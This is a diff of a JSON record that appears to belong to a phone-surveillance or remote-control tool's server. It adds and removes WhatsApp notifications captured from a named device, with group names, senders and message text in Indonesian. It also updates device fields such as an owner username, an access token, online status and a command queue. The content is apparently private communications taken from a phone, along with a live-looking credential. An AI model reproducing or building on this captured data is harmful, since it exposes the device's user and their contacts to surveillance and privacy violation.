@@ -22,6 +22,38 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2028 pesan dari 18 chat",
+        "time": "29/04 20:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777464682682
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (241 pesan): ~ abi ksma nope 2",
+        "content": "📷 yakin mas ga coba beli yg ff ml disini? List harga langsung tanyain ke pm gas dah😋",
+        "time": "29/04 20:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777464682646
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2026 pesan dari 18 chat",
+        "time": "29/04 20:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777464680455
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (242 pesan): ~ ༒︎sy♱#𝙻𝚂𝚃𝙲/𝕬𝕭𝖄𝕾𝕾/𝟐𝟐𝟓/𝟑𝟎𝟒",
+        "content": "engga",
+        "time": "29/04 20:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777464680034
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (240 pesan): ~ joki terlupakan",
         "content": "Pm",
         "time": "29/04 20:22",
@@ -3987,38 +4019,6 @@
         "time": "29/04 20:13",
         "pkg": "com.whatsapp",
         "receivedAt": 1777464160308
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1888 pesan dari 18 chat",
-        "time": "29/04 20:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777464159413
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐉𝐁 𝟒 ||  𝐊𝐈𝐍𝐆 𝐕𝐀𝐋𝐙  ✨ (49 pesan): ~ Valz Str [01]",
-        "content": "💟 Stiker",
-        "time": "29/04 20:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777464159371
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (225 pesan): ~ DD||KING ANDIKUSMAWAN",
-        "content": "📷 V300+ fs? Pm op 170++ \nOpen nego",
-        "time": "29/04 20:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777464159012
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙅𝙊𝙈𝙊𝙆𝙀𝙍𝙎 𝘼𝙍𝙀𝘼 𝙋𝙀𝙉𝙂𝙃𝙔𝙏𝘼𝙈𝘼𝙉⚔️👑 (479 pesan): ~ invl",
-        "content": "💟 Stiker",
-        "time": "29/04 20:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777464158954
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777464679092,
+    "lastSeen": 1777464682103,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
